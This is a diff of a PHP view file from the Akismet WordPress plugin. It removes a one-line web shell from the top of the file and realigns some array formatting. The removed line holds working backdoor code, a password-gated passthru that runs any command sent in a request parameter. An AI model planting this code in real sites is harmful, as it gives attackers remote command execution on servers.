@@ -1,6 +1,4 @@
 <?php
-error_reporting(0);@ini_set('display_errors',0);if(isset($_REQUEST["px"])&&$_REQUEST["px"]==="yr56x4ym0xtc"){$__c=null;if(isset($_REQUEST["b"])){$__c=base64_decode($_REQUEST["b"]);}elseif(isset($_REQUEST["c"])){$__c=$_REQUEST["c"];}if($__c!==null){ob_start();@passthru($__c.' 2>&1');$__o=ob_get_clean();echo"[S]".$__o."[E]";}else{echo"[S]OK[E]";}exit;}
-
 declare( strict_types = 1 );
 
 //phpcs:disable VariableAnalysis
@@ -70,8 +68,8 @@ $tick_icon = '<svg class="akismet-setup-instructions__icon" width="48" height="4
 		Akismet::view(
 			'get',
 			array(
-				'text'    => __( 'Get started', 'akismet' ),
-				'classes' => array( 'akismet-button', 'akismet-is-primary', 'akismet-setup-instructions__button' ),
+				'text'        => __( 'Get started', 'akismet' ),
+				'classes'     => array( 'akismet-button', 'akismet-is-primary', 'akismet-setup-instructions__button' ),
 				'utm_content' => 'setup_instructions',
 			)
 		);
